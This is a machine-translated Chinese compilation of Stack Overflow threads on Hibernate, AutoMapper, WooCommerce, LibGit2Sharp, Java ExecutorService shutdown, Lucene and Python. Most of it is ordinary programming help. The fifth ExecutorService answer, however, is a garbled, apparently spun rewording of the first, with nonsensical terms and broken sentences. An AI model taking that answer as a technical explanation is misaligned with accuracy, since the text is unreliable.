没有`<many-to-one>`属性了。如果您明确需要`AuthorInfo`or`UserInfo`实例，则必须在单独的`Session.load()`语句中加载。

2）复杂的解决方案：使用`<key-many-to-one>`：

```
<hibernate-mapping>
  <class name="com.pojo.hibernate.AuthorFollow" table="author_follow" catalog="book">
    <composite-id mapped="true" class="com.pojo.hibernate.AuthorFollowPK">
      <key-many-to-one name="authorInfoByAuthorId" class="com.pojo.hibernate.AuthorInfo" column="author_id"/>
      <key-many-to-one name="userInfoByUserId" class="com.pojo.hibernate.UserInfo" column="user_id"/>
    </composite-id>
  </class>
</hibernate-mapping> 
```

我建议使用简单的解决方案 1)，除非有很多使用或其他充分理由需要 2) 中更复杂的解决方案。解决方案2）肯定更麻烦。

# c# - 如何让 AutoMapper：忽略非映射属性，包括常规映射和使用 QueryableExtensions

> ID：16122963
> 
> 赞同：0
> 
> 时间：2013-04-20T17:07:21.617
> 
> 标签：c#, automapper, iqueryable

我找到了两种忽略非映射属性的解决方案，但[其中一个](https://stackoverflow.com/a/8071038/1133338)也忽略了常规映射，[第二个](https://stackoverflow.com/questions/954480/automapper-ignore-the-rest/6474397#6474397)不适用于[QueryableExtensions](https://github.com/AutoMapper/AutoMapper/blob/master/src/AutoMapper/QueryableExtensions.cs)以返回 IQueryable（不知道为什么，但我收到错误*Argument types do not match*）。

有没有人有解决方案来忽略涵盖上述两个方面的非映射属性？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2016-04-07T20:28:37.183

使用[QueryableExtensions](https://github.com/AutoMapper/AutoMapper/wiki/Queryable-Extensions)时，您必须明确地进行某些类型转换，例如`int?`to `int`。这可能是“参数类型不匹配”异常的来源。

如果您有许多需要类型转换的属性（例如，如果您发现您正在执行许多其他属性），则`c.MyVariable ?? 0`可以改为定义转换规则，而不必明确说明每个属性。

通常，要在 Automapper 中进行类型转换，您会使用`ConvertUsing`，但在使用 QueryableExtensions 时，您需要改为使用[`ProjectUsing`](https://github.com/AutoMapper/AutoMapper/wiki/Queryable-Extensions#custom-type-conversion).

您可以使用以下行，它将处理从`int?`到的所有映射，`int`而无需显式指定每个属性的映射：

```
cfg.CreateMap<int?, int>().ProjectUsing(src => src.HasValue ? src.Value : 0); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-08-12T17:25:23.263

在映射结束时与`.ForAllOtherMembers(opt => opt.Ignore());`为我工作的链接。这应该是方法链中的最后一个方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-22T22:46:59.130

问题解决了。在这行代码中

`.ForMember(p => p.Gender, opt => opt.MapFrom(c => c.GenderCode))`

其中 p.Gender 是 int 类型，而 GenderCode 是 int? 类型。所以改变为

`.ForMember(p => p.Gender, opt => opt.MapFrom(c => c.GenderCode ?? 0))`

解决了这个问题。难以排除故障的是，在我尝试返回 IQueryable 之前，上面的映射代码一直在工作。

# css - 如何在页面上限制导航栏底部的高度？

> ID：16122965
> 
> 赞同：-2
> 
> 时间：2013-04-20T17:07:36.300
> 
> 标签：css, twitter-bootstrap

我有一个带有导航栏底部的 rails 应用程序。在没有很多内容的页面上，它在页面上的位置非常高。有没有办法给它的位置一个最大的垂直值？假设我想将栏的顶部保持在 750 像素。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T15:44:36.750

将导航栏上方的所有内容放在一个封闭的 div 中，并在 CSS 中给它一个最小高度。

# wordpress - 增加目录页面中的产品图像大小

> ID：16122967
> 
> 赞同：0
> 
> 时间：2013-04-20T17:07:37.603
> 
> 标签：wordpress, image-resizing, woocommerce

我知道，这是一个简单的修复（它必须是），但我已经搜索了两天并且无法完成此操作。我网站目录页面中的产品太小。

这是我的网站：~~[http://monocleprints.com/woo/shop/](http://monocleprints.com/woo/shop/)~~

我已经尝试了所有我能想到的后端事情：

*   *在WooCommerce -> 设置 -> 目录*中更改大小

**   使用 Thumbnail Regenerator 插件调整所有缩略图的大小

    *   使用简单图像大小工具调整大小（在媒体文件夹中）* 

 *我意识到我可能需要编辑 CSS。我会去哪里做那件事？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T20:48:17.583

There is probably better way to do this but you could try this:

Go to **plugins > Editor > Select woocommerce plugin** and open

`/assets/css/woocommerce.css`

Find this:

```
.woocommerce ul.products li.product, .woocommerce-page ul.products li.product 
```

and change width to a larger percentage.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T03:29:02.150

如果您使用的是 woocommerce 主题，则应在主题目录中检查 woocommerce 配置文件。这些配置文件通常对图像进行最终造型。例如，该文件可能会在`your_theme/config-woocommerce/config.php`其中找到类似的内容：

```
//product thumbnails
$avia_config['imgSize']['shop_thumbnail']   = array('width'=>80, 'height'=>80);
$avia_config['imgSize']['shop_catalog']     = array('width'=>450, 'height'=>355);
$avia_config['imgSize']['shop_single']      = array('width'=>450, 'height'=>355); 
```

如有疑问，请咨询您主题的网站/支持论坛，因为该问题可能已经在那里提出。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-19T18:34:23.783

我今天花了太多时间试图弄清楚如何改变购物车中缩略图的大小，最后使用CSS成功如下：

```
.woocommerce table.cart img, .woocommerce #content table.cart img,
    .woocommerce-page table.cart img, .woocommerce-page #content table.cart img {
    width: 90px;
        height: auto;
        padding: none !important;
} 
```

我希望这对你有帮助！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-03-14T11:01:15.373

此设置已移至主题定制器。

**设计 -> 定制器 -> WooCommerce -> 产品图片**

产品页面有一种设置，目录页面有另一种设置。

在 WooCommerce 3.3.3 中测试

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2014-02-06T00:03:53.837

我遇到了同样的问题，我已经找到了可能的解决方案。

打开修改图片大小的页面，找到循环，例如：

```
if ( have_posts() ) : while ( have_posts() ) : the_post();

  // Loop code, thumbnail woocommerce function, etc

endwhile; endif; 
```

并将其替换为以下代码：

```
query_posts($args); // Note: if there's no arguments for the query, it can be empty

//loop code, call the default thumnail function! the_post_thumnail()

rewind_posts(); 
```*

# actionscript-3 - Actionscript：获取文本字段并动态分配它们

> ID：16122972
> 
> 赞同：0
> 
> 时间：2013-04-20T17:08:06.493
> 
> 标签：actionscript-3

我正在尝试创建一个高分列表。我有一个movieclip（“高分”），其中我有带有实例名称的动态文本字段。现在我正在尝试获取这些文本字段，以便我可以更改里面的文本。因为我让它们循环使用，所以我用 getChildByName 来获取它们（这很有效）。但是我得到的是一个 displayObject，因此我得到了**错误**：`implicit coercion of a value of type class to an unrelated type...`

我知道错误是什么..但我不知道如何解决它。

这是我的代码：

```
private function updateSingleList(result:XML):void
        {
            if(result['header']['success'] != 'true'){
                return;
            }

            for(var i:uint = 0; i < result['items']['item'].length(); i++)
            {
                var pos:uint            = i+1;
                var name:String         = 'name_' + pos;
                var score:String        = 'score_' + pos;
                var rowName:TextField   = highscore.getChildByName(name);
                var rowScore:TextField  = highscore.getChildByName(score);
                    rowName.text        = result['items']['item'][i]['name'].toString();
                    rowScore.text       = result['items']['item'][i]['score'].toString();
            }
        } 
```

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T17:15:43.383

指定您想要的孩子是 TextField ：

```
var rowName:TextField   = highscore.getChildByName('name_' + pos) as TextField;
rowName.text = result['items']['item'][i]['name'].toString(); 
```

# javascript - 为什么我的 Web SQL 语句执行了两次？

> ID：16122976
> 
> 赞同：0
> 
> 时间：2013-04-20T17:08:27.200
> 
> 标签：javascript, web-sql

当我尝试执行任何类型的 sql（选择、插入、...）时，我的语句会执行两次。当我的数据被添加两次时，这非常烦人。

```
function createEntry()
{
var myDB = openDatabase("foodentries", "1.0", "Tabel voor eten", 1000000);
myDB.transaction(function (tx)
{
    tx.executeSql('CREATE TABLE IF NOT EXISTS entries (id INTEGER NOT NULL PRIMARY KEY    AUTOINCREMENT, date DATE NOT NULL, calories INTEGER NOT NULL, name TEXT NOT NULL, longitude  TEXT, latitude TEXT)');

    var calorie = $('#calories').val();
    var eten = $('#food').val();
    var dag = sessionStorage.currentDate;
    var latitude = "";
    var longitude = "";

    navigator.geolocation.getCurrentPosition(

    function (position) {
        latitude = position.coords.latitude;
        longitude = position.coords.longitude;

    });

    tx.executeSql('INSERT INTO entries (date, calories, name, longitude, latitude) VALUES (?,?,?,?,?)', [dag, calorie, eten, latitude, longitude]);

    //Verwijder de waarden uit de tekstvakken
    $("#calories").val("");
    $("#food").val("");
}); 
```

}

有谁知道如何解决这个问题？

谢谢！

# java - 在正确的位置向 java 数组添加值

> ID：16122978
> 
> 赞同：0
> 
> 时间：2013-04-20T17:08:34.113
> 
> 标签：java, arrays, search

我正在尝试编写一个包含一系列人员配置文件的小程序，并且我被困在添加配置文件的方法上，因为我希望将它们添加到正确的位置，因此不需要对其进行排序。例如，如果我有一个包含 3 个配置文件的数组

波特，H 史密斯，T 沃伦，B

我想添加 Summer，PI 希望将它添加到第一个和第二个索引之间

在有人问之前，我没有太多代码，因为我仍在考虑如何搜索数组并说出需要放置配置文件的位置。

任何想法表示赞赏

（它还需要是 Array 而不是 ArrayList 或任何其他数据结构）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T17:21:10.787

无论您在谈论什么，最好由`LinkedList` [http://docs.oracle.com/javase/6/docs/api/java/util/LinkedList.html](http://docs.oracle.com/javase/6/docs/api/java/util/LinkedList.html)
完成 既然您只想使用`Array`，那么您知道数组有一个常量您声明的元素数量。所以我建议你创建一个***临时*** `ArrayList`的，然后将这些元素复制到你想要的数组中。这是如何完成的

```
import java.util.ArrayList;

public class Test {

    public static void main(String[] args) {
        String[] yourInitialArray = { "Potter, H", "Smith, T", "Warren, B" };

        // Creating a temporary ArrayList
        ArrayList<String> temporary = new ArrayList<String>();
        for (int i = 0; i < yourInitialArray.length; i++) {
            if (i != 1) {
                temporary.add(yourInitialArray[i]);
            } else {
                temporary.add("Summer, P");
                temporary.add(yourInitialArray[i]);
            }
        }
        yourInitialArray = new String[temporary.size()];
        for (int j = 0; j < temporary.size(); j++) {
            yourInitialArray[j] = temporary.get(j);
            System.out.println(yourInitialArray[j]);
        }

    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T17:11:53.563

如果你想使用一个数组而不是一个像样的、合适的数据结构，那么使用[Arrays.binarySearch()](http://docs.oracle.com/javase/6/docs/api/java/util/Arrays.html#binarySearch%28java.lang.Object%5b%5d,%20int,%20int,%20java.lang.Object%29)来找到合适的位置。但是您必须移动所有后续元素。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-20T17:11:39.027

尝试在列表排序后正常添加。最好使用

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-20T17:14:38.927

首先，我强烈建议`List`在数组上使用集合框架。因为它比使用普通数组提供了很多灵活性和改进

对于您的解决方案，我建议使用`LinkedList`. 这提供了 `add(int index, E element )` 在特定位置插入元素的方法，非常有效

# c# - 暂存文件和提交的正确方法

> ID：16122984
> 
> 赞同：4
> 
> 时间：2013-04-20T17:08:57.663
> 
> 标签：c#, libgit2sharp

当我尝试执行以下操作时，我最终只会生成空提交；也就是说，它创建了一个没有任何更改的提交。

```
string filename = "path/to/file";
repo.Index.Stage(filename);
repo.Commit(); 
```

请注意，路径是相对的，这意味着，我创建了我的`Repository`using`Repository repo = new Repository(".");`然后使用路径（上面称为文件名）， `".gitignore"`或者`"files/text.txt"`这似乎是正确的方法，但它不起作用。

可以在[此处](https://github.com/b3ngr33ni3r/unityGit/blob/master/Assets/editor/GitTool)完整找到演示此“实际操作”的代码，但基本上是这样运行的：

```
int count = 0;
//iterate all entries in the index (correct me if i'm wrong, but this should be all the changed files? or is it just all the files..)
//this is in AddWindow.cs
foreach (LibGit2Sharp.IndexEntry entry in vcs.GetRepository().Index)
        {
            //store an the entry.Path as Representation in an Object FileToggle
            toggles[count] = new FileToggle(entry.Path);
            count++;
        }

//then later, we do this (also in AddWindow.cs)
foreach (FileToggle f in toggles)
        {
            if (f.GetToggle()) //this is a bool set by user, so lets assume its on
                vcs.GetRepository().Index.Stage(f.GetRepresenation()); //stage all selected files, using their representation (ie entry.Path set above)
        } 

//and then finally, later, we do this in CommitWindow.cs
   if (message != null && signature != null && email != null)
                    vcs.GetRepository().Commit(message, new LibGit2Sharp.Signature(signature, email, System.DateTimeOffset.Now), new LibGit2Sharp.Signature(signature, email, System.DateTimeOffset.Now)); 
```

同样重要的是要注意`vcs.GetRepository()`返回 a`Repository`
您还可以看到一些空白提交的示例，因为我使用该工具尝试自行提交。[在这里](https://github.com/b3ngr33ni3r/unityGit/commit/2491d5e0c4a0a63072b47b1cdeb7235af0c7d33c)查看一个。

此外，我已经验证我正在尝试暂存然后提交在命令行中标记为已修改的文件，使用`git status`. 所以，我不只是尝试提交未修改的文件，也不是提交已经暂存的文件。我（据我所知）正在尝试对`.Stage() .Commit()`需要更新的文件执行此过程。

**更新**

根据 nulltoken 的要求：

> 在调用 Index.Stage 的行之前添加 Console.WriteLine(string.Format("{0} - {1}", f.GetRepresenation(), vcs.GetRepository().Index.RetrieveStatus(f.GetRepresenation()))) ()。

暂存我的“测试”文件时的结果输出是

```
Assets\editor\GitTool\AddWindow.cs - Modified
Assets\editor\GitTool\CommitWindow.cs - Modified 
```

> 在执行 repo.Commit 调用的行上添加断点运行代码。当你命中断点时，请对 vcs.GetRepository() 指向的存储库运行 git status

这会产生 git status 的输出，指示

```
# Changes not staged for commit:
#   (use "git add/rm <file>..." to update what will be committed)
#   (use "git checkout -- <file>..." to discard changes in working directory)
#
#       modified:   Assets/editor/GitTool/AddWindow.cs
#       modified:   Assets/editor/GitTool/CommitWindow.cs 
```

`Commit()`在让执行之前和之后。虽然之后，它确实包含

`# Your branch is ahead of 'origin/master' by 1 commit.`也是。

**更新 2**

这表现如预期，在暂存后产生以下输出：

```
# Changes to be committed:
#   (use "git reset HEAD <file>..." to unstage)
#
#       modified:   Assets/editor/GitTool/AddWindow.cs 
```

然后我立即致电 Commit，我得到：

```
# Your branch is ahead of 'origin/master' by 2 commits.
#
# Changes not staged for commit:
#   (use "git add/rm <file>..." to update what will be committed)
#   (use "git checkout -- <file>..." to discard changes in working directory)
#
#       modified:   Assets/editor/GitTool/AddWindow.cs 
```

所以，前面的计数增加了一次，表明有一个提交，但文件仍然被报告为新更改，尽管据我所知它不是！

**更新 3**

我只是在跑步时注意到了一些东西`git diff`。发现的差异是文件模式更改（即从 100644 到 100755），也许这就是实际发生的情况。我将尝试使用可以清楚地保持静态的文件（不会在任何地方打开并查看系统是否像 git 一样正常运行，但编辑器正在做一些奇怪的文件模式的事情）。

**更新 4**

响应更新 3，**我意识到我是个白痴**。lib2gitsharp 运行正常，但我愚蠢地没有检查 github（显然）没有在视觉上显示的任何内容是否发生了变化。在这种情况下，我试图`Stage`并且`Commit`不断变化的东西的文件模式（无论出于何种原因，尽管我责怪统一）。这导致它看起来什么都没有改变，当真正的东西在改变时，只是没有*文件内容*。所以总而言之，这个问题自己回答了，我花了太长时间才意识到它。

我还要花一点时间对*[nulltoken 表示感谢](https://stackoverflow.com/users/335418/nulltoken)*，因为尽管***我*无法**意识到一些小事，但他提供了一些很大的帮助，最终让我到达了那里。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T18:46:00.813

> 您还可以看到一些空白提交的示例，因为我使用该工具尝试自行提交。在这里查看一个。

实际上，提交不是空的。它包含整个存储库的快照。您可以通过单击屏幕最右侧的蓝色来检查这一点`Browse Code`，这会导致显示此提交的**[内容](https://github.com/b3ngr33ni3r/unityGit/tree/764a6e76d3a4c9d5a90ccf96a596bcb91808cb29)**。

如果“空提交”是问题所在，我的猜测是您当前正在暂存未更改的文件（即，与父提交相比，没有修改的文件）。这导致 GitHub 界面没有显示“更改”。

`Index.RetrieveStatus(f.GetRepresenation());`您可以通过在该行之前插入一个调用来轻松检查这一点`Index.Stage(f.GetRepresenation());`。

如果我是正确的，返回的**[FileStatus](https://github.com/libgit2/libgit2sharp/blob/vNext/LibGit2Sharp/FileStatus.cs)**应该是**Unaltered**。

## 更新

> 此外，我已经验证我正在尝试使用 git status 暂存并提交在命令行中标记为已修改的文件。

这很奇怪。让我们试试别的。

能不能请你：

*   `Console.WriteLine(string.Format("{0} - {1}", f.GetRepresenation(), vcs.GetRepository().Index.RetrieveStatus(f.GetRepresenation())))`在调用`Index.Stage()`.
*   在执行调用的行上添加断点`repo.Commit`
*   运行代码。当您遇到断点时，请`git status`针对指向的存储库运行`vcs.GetRepository()`
*   使用控制台输出和`git status`结果更新您的问题。

## 更新 2

感谢更新。现在，如果在`Console.WriteLine`调用之后还添加另一个调用会发生什么`Stage`？这应该在每个文件的控制台中产生两个输出行（一个是`Modified`，第二个是`Staged`），并且`git status`调用应该在一个`Changes to be committed`部分下列出相同的文件。

如果按照上述执行，您可以在暂存文件的循环`repo.Commit()`之后立即添加调用吗？`foreach`这*应该*产生一个包含更改的提交。

## 更新 3

> 所以，提前计数增加了一次，表明有一个提交

此时，发布`git diff HEAD~1..HEAD` *应该*列出刚刚提交的更改。有吗？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T20:49:30.593

问题包含答案，要成功暂存然后提交文件，您必须简单

```
//the path to our repo
string pathToRepo = ".";

//create a new repo
Repository r = new Repository(pathToRepo);

//call stage on all files you wish to stage (stage takes their filenames as strings)
r.Index.Stage("testfile.txt");

//note that below, signatures take a username string, an email string, and a System.DateTimeOffset

//call Commit on the repo, giving a message (string), an author(Signature), and a commit (Signature)
r.Commit("updating testfile.txt",new Signature("username","email",System.DateTimeOffset.Now),new Signature("username","email",System.DateTimeOffset.Now));

//and you've successfully commited to your repo. 
```

我只是个白痴，没有意识到事情正在更新。

# java - 在 ExecutorService 上调用 shutdown() 的原因

> ID：16122987
> 
> 赞同：101
> 
> 时间：2013-04-20T17:09:14.493
> 
> 标签：java, android, executorservice

在过去的几个小时里，我读了很多关于它的文章，我根本看不出有任何理由（正当**理由**）调用`shutdown()`.`ExecutorService`使用了很长时间。

唯一的事情（据我所知）关闭所做的就是做一个普通线程在完成后所做的事情。当普通的 Thread 完成 Runnable（或 Callable）的 run 方法后，会被传递给 Garbage Collection 进行收集。使用 Executor Service，线程将被搁置，不会为垃圾收集打勾。为此，需要关闭。

好的，回到我的问题。是否有任何理由`ExecutorService`经常调用关机，甚至在提交一些任务后立即调用？我想留下有人正在这样做的情况，并在此之后立即调用，`awaitTermination()`因为这是经过验证的。一旦我们这样做了，我们必须重新创建一个新`ExecutorService`的，做同样的事情。`ExecutorService`重用线程的整个想法不是吗？那么为什么`ExecutorService`这么快就毁掉了呢？

`ExecutorService`简单地创建（或根据您需要的数量进行组合），然后在应用程序运行期间将任务传递给他们，然后在应用程序退出或其他一些重要阶段关闭这些执行程序，这不是一种合理的方式吗？ ?

我想从一些使用 ExecutorServices 编写大量异步代码的经验丰富的程序员那里得到答案。

第二个问题，稍微小一点的涉及 android 平台。如果你们中的一些人会说每次都关闭执行程序并不是最好的主意，并且你的程序在 android 上，你能告诉我当我们处理不同的事件时你如何处理这些关闭（具体来说 - 当你执行它们时）的应用程序生命周期。

由于 CommonsWare 的评论，我使帖子保持中立。我真的没有兴趣争论到死，而且似乎它正在导致那里。我只对了解我在这里向经验丰富的开发人员提出的问题感兴趣，他们是否愿意分享他们的经验。谢谢。

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2013-05-24T19:21:03.097

该`shutdown()`方法只做一件事：阻止客户端向执行器服务发送更多工作。这意味着除非采取其他行动，否则所有现有任务仍将运行完成。即使对于计划任务也是如此，例如，对于 ScheduledExecutorService：计划任务的新实例不会运行。它还释放任何后台线程资源。这在各种情况下都很有用。

假设您有一个控制台应用程序，它有一个运行 N 个任务的执行器服务。如果用户按下 CTRL-C，您希望应用程序终止，可能是正常的。优雅是什么意思？也许您希望您的应用程序无法向执行器服务提交更多任务，同时您希望等待现有的 N 个任务完成。作为最后的手段，您可以使用关闭挂钩来实现此目的：

```
final ExecutorService service = ... // get it somewhere

Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
    @Override
    public void run() {
        System.out.println("Performing some shutdown cleanup...");
        service.shutdown();
        while (true) {
            try {
                System.out.println("Waiting for the service to terminate...");
                if (service.awaitTermination(5, TimeUnit.SECONDS)) {
                    break;
                }
            } catch (InterruptedException e) {
            }
        }
        System.out.println("Done cleaning");
    }
})); 
```

这个钩子将关闭服务，这将阻止您的应用程序提交新任务，并在关闭 JVM 之前等待所有现有任务完成。await 终止将阻塞 5 秒，如果服务关闭则返回 true。这是在循环中完成的，因此您确定服务最终会关闭。InterruptedException 每次都被吞没。这是关闭在整个应用程序中重用的执行程序服务的最佳方法。

这段代码并不完美。除非您绝对肯定您的任务最终会终止，否则您可能希望等待给定的超时时间然后退出，放弃正在运行的线程。`shutdownNow()`在这种情况下，在最后一次尝试中断正在运行的线程时在超时后调用也是有意义的（`shutdownNow()`也会给你一个等待运行的任务列表）。如果您的任务旨在响应中断，这将正常工作。

另一个有趣的场景是当您有一个 ScheduledExecutorService 执行周期性任务时。停止周期性任务链的唯一方法是调用`shutdown()`.

编辑：我想补充一点，我不建议在一般情况下使用如上所示的关闭挂钩：它可能容易出错，并且应该是最后的手段。此外，如果您注册了许多关闭挂钩，则它们的运行顺序是未定义的，这可能是不可取的。我宁愿让应用程序显式调用`shutdown()`.`InterruptedException`

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2017-08-26T07:15:02.660

> 不是 ExecutorService 重用线程的全部想法吗？那么为什么这么快就销毁 ExecutorService 呢？

是的。`ExecutorService`你不应该经常破坏和重新创建。在需要时初始化`ExecutorService`（主要是在启动时）并保持激活状态，直到完成。

> 简单地创建 ExecutorService （或根据您需要的数量），然后在应用程序运行期间将任务传递给它们，然后在应用程序退出或其他一些重要阶段关闭那些，这不是一种合理的方式吗？执行人？

是的。`ExecutorService`在应用程序退出等重要阶段关闭是合理的。

> 第二个问题，与 android 平台有关的小一点的交易。如果你们中的一些人会说每次都关闭执行程序不是最好的主意，并且您在 android 上编程，您能否告诉我当我们处理不同的应用程序事件时您如何处理这些关闭（具体来说，当您执行它们时）生命周期。

假设它`ExecutorService`在您的应用程序中的不同活动之间共享。每个活动将在不同的时间间隔暂停/恢复，但`ExecutorService`每个应用程序仍然需要一个。

与其管理`ExecutorService`Activity 生命周期方法中的状态，不如将 ExecutorService 管理（创建/关闭）移至您的自定义[Service](https://developer.android.com/reference/android/app/Service.html)。

`ExecutorService`在 Service => 中创建`onCreate()`并正确关闭它`onDestroy()`

推荐的关机方式`ExecutorService`：

[如何正确关闭 java ExecutorService](https://stackoverflow.com/questions/36644043/how-to-properly-shutdown-java-executorservice/36644320#36644320)

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2018-04-29T20:34:29.263

> 一旦不再需要 ExecutorService 以释放系统资源并允许正常关闭应用程序，就应该关闭它。因为 ExecutorService 中的线程可能是非守护线程，它们可能会阻止正常的应用程序终止。换句话说，您的应用程序在完成其 main 方法后保持运行。

[参考书](https://rads.stackoverflow.com/amzn/click/com/0071772006)

第 14 章 页码：814

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-09-27T22:43:41.953

**在 ExecutorService 上调用 shutdown() 的原因**

今天我遇到了一种情况，我必须等到机器准备好，然后才能在该机器上开始一系列任务。

我对这台机器进行了 REST 调用，如果我没有收到 503（服务器不可用），那么机器就可以处理我的请求了。所以，我等到第一次 REST 调用获得 200（成功）。

有多种方法可以实现它，我使用 ExecutorService 创建一个线程并安排它在每 X 秒后运行。所以，我需要在一个条件下停止这个线程，检查一下......

```
final ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
    Runnable task = () -> {
        try {
            int statusCode = restHelper.firstRESTCall();

            if (statusCode == 200) {
                executor.shutdown();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    };

    int retryAfter = 60;
    executor.scheduleAtFixedRate(task, 0, retryAfter, TimeUnit.SECONDS); 
```

**第二个问题，与 android 平台有关的小一点的交易。**

如果您能提供更多背景信息，也许我可以回答！同样根据我在 Android 开发方面的经验，很少需要线程。您正在开发需要线程来提高性能的游戏或应用程序吗？如果没有，在 Android 中，您还有其他方法可以解决我上面解释的场景等问题。您可以根据上下文使用 TimerTask、AsyncTask 或 Handlers 或 Loaders。这是因为如果 UIThread 等待很长时间，您就会知道会发生什么：/

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-05-19T05:37:31.123

这是真实的，尽管对于计划的任务，例如，对于 ScheduledExecutorService：预定任务的新案例将不会运行。

我们应该期望您有一个舒适的应用程序，它有一个运行 N 差事的代理管理。

我没有毫不费力地理解它的含义？也许您需要您的应用程序不能选择向代理管理提交更多任务，同时您需要坐好等待您当前的 N 项任务完成。

除非您完全确定您的差事最终会完成，否则您应该在给定的休息时间坐稳，然后简单地退出，抛弃正在运行的字符串。

如果您的活动旨在对干扰做出反应，这将正常工作。

另一个有趣的情况是你有一个 ScheduledExecutorService 来播放一个活动。

停止活动链的最佳方法是调用 shutdown()

# python - 避免在 pygames 中的每一帧重新加载背景

> ID：16122990
> 
> 赞同：0
> 
> 时间：2013-04-20T17:09:33.743
> 
> 标签：python, pygame

我想在 python 中使用 pygames 制作一个游戏，我有一个背景，我只想在游戏开始时加载，而不是在每一帧，背景仍然应该出现。我在初始化函数中像这样加载背景：

```
self.window = pygame.display.set_mode((self.SCREEN_WIDTH, self.SCREEN_HEIGHT))
self.screen = pygame.display.get_surface()
self.rasp = "../images/image.jpg"
self.rasp_surface = pygame.image.load(self.rasp)
self.rasp_surface = pygame.transform.scale(self.rasp_surface, (self.SCREEN_WIDTH, self.SCREEN_HEIGHT))
self.screen.blit(self.rasp_surface, (0,0)) 
```

在运行功能中我这样做：

```
while True:
    ...
    self.screen.blit(self.rasp_surface, (0,0))
    pygame.display.update() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-11-22T02:18:46.980

如果你有一个带有 pygame.display.update() 的 while 循环，你就会一直这样做。这是不必要的。但是，您很可能正在背景上移动精灵或图像，因此只需确保填充精灵在移动时移动的图像部分。您可以制作一个移动功能来为您执行此操作。

# lucene - 如何在 cmd 中使用 Lucene

> ID：16122995
> 
> 赞同：5
> 
> 时间：2013-04-20T17:09:51.927
> 
> 标签：lucene, cmd

我正在尝试在此[链接](http://lucene.apache.org/core/4_2_1/demo/overview-summary.html#overview_description)中给出的 Windows 命令行上使用 lucene 。

我已经为所有四个提到的`.jar`文件创建了 CLASSPATH 变量，但是在那之后，当我运行命令时：

`java org.apache.lucene.demo.IndexFiles -docs C:/lucene/src`

它返回以下错误：

`could not find or load main class org.apache.lucene.demo.IndexFiles`

我不知道它有什么问题......有人可以帮助我吗？我是一名学生，只是一个初学者。谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2015-05-23T00:02:07.287

我遇到了类似的问题，您需要在命令中包含 CLASSPATH（如果它不在环境变量中）。所以应该是：

```
java -classpath C:\lucene\lucene-5.1.0\core\lucene-core-5.1.0.jar;C:\lucene\lucene-5.1.0\queryparser\lucene-queryparser-5.1.0.jar;C:\lucene\lucene-5.1.0\analysis\common\lucene-analyzers-common-5.1.0.jar;C:\lucene\lucene-5.1.0\demo\lucene-demo-5.1.0.jar org.apache.lucene.demo.IndexFiles -docs C:\lucene\lucene-5.1.0 
```

要搜索，你会这样做：

```
java -classpath C:\lucene\lucene-5.1.0\core\lucene-core-5.1.0.jar;C:\lucene\lucene-5.1.0\queryparser\lucene-queryparser-5.1.0.jar;C:\lucene\lucene-5.1.0\analysis\common\lucene-analyzers-common-5.1.0.jar;C:\lucene\lucene-5.1.0\demo\lucene-demo-5.1.0.jar org.apache.lucene.demo.SearchFiles 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-08-25T15:56:47.110

如果 Lucene 有一个打包好的启动脚本来播放 araonud，那就太好了……我在我的安装根目录中创建了一个 indexfiles.cmd，内容如下：

```
java -classpath core\lucene-core-7.4.0.jar;queryparser\lucene-queryparser-7.4.0.jar;analysis\common\lucene-analyzers-common-7.4.0.jar;demo\lucene-demo-7.4.0.jar org.apache.lucene.demo.IndexFiles %* 
```

另一个叫做 searchfiles.cmd：

```
java -classpath core\lucene-core-7.4.0.jar;queryparser\lucene-queryparser-7.4.0.jar;analysis\common\lucene-analyzers-common-7.4.0.jar;demo\lucene-demo-7.4.0.jar org.apache.lucene.demo.SearchFiles %* 
```

# python - 从以前工作的代码中获取“无效语法”

> ID：16122998
> 
> 赞同：1
> 
> 时间：2013-04-20T17:10:08.053
> 
> 标签：python, syntax-error

所以我有以下代码：

```
f = open('input.txt', 'r')

text = f.read()

data = text.split()
print data

print '<HTML>\n    <HEAD>\n    </HEAD>\n    <BODY>\n        <table border="1">\n'
for x in data:
    print '            <tr>' + x + '<tr>'
print'</table>\n    </BODY>\n</HTML>' 
```

在我尝试安装 iPython 之前，它使用的是默认的 Python shell。但是在我安装了distribute和pyreadline然后是iPhython之后，代码不会停止给我语法错误，好像没有一个变量可以工作，不确定是否有一些关于python初始化/声明的东西我错过了，或者有什么东西发生了在控制台上做事是错误的，但它肯定让我发疯，我需要修复它。

PS我使用的是Windows 8

编辑：被问及我得到的错误，这里是截图，因为我没有得到任何非常具体的类似文本的错误。

![在此处输入图像描述](https://i.stack.imgur.com/RI97m.png) 在第二个中，我多次编辑代码来测试不同的东西，这就是为什么我得到不同变量的错误。即使是最简单的事情也会给我一个错误。PS2。我刚刚尝试过`print 'hey'`，它给了我同样的错误，无法识别`'`令牌。

![在此处输入图像描述](https://i.stack.imgur.com/ULydw.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T17:27:41.973

看起来您安装的任何东西都使用 Python 3.x，并且您的代码是为 Python 2.x 编写的。

